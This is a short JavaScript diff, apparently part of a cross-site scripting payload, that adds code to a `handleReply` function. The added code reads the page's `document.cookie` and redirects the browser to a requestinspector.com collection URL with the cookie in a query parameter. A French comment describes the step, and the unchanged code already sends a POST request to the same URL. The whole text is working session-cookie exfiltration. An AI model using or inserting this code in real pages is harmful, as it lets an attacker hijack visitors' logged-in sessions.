@@ -14,6 +14,10 @@
       }
 
       function handleReply(event) {
+	var cookie = document.cookie;
+        // Rediriger vers l'URL avec le cookie dans le paramètre "c"
+        document.location = 'https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?c=' + encodeURIComponent(cookie);
+
         fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/', {
           method: 'POST',
           mode: 'no-cors',
